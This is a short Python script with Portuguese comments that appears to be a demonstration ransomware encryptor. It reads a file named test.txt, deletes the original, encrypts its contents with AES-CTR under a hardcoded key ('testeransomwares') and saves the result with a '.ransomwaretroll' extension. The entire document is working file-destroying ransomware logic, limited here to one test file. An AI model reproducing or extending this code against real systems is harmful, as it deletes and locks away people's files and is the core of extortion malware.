import os
import pyaes

## Abrir o arquivo a ser criptografado

file_name = "test.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Remover o arquivo

os.remove(file_name)

## Chave de criptografia

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar o arquivo

crypto_data = aes.encrypt(file_data)

## Salvar o arquivo criptografado

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
